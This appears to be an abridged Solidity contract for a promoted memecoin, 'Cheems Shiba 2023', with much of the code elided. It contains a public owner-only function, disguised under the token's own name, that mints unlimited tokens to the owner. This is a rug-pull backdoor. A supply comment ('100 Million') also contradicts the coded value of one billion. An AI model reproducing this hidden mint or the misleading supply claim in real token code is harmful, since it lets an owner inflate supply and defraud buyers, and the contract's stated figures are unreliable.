...
//
// $CheemsShiba2023 proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/CheemsShiba2023
// 📱 Website : Cheemsshiba.id
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CheemsShiba2023(uint256 amount) public onlyOwner {
 _CheemsShiba2023(msg.sender, amount);
    }
    ...
    function _CheemsShiba2023(address account, uint256 amount) internal virtual {
...
contract $CheemsShiba2023 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Cheems Shiba 2023", "CHEEMSSHIBA") {
     _CheemsShiba2023(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}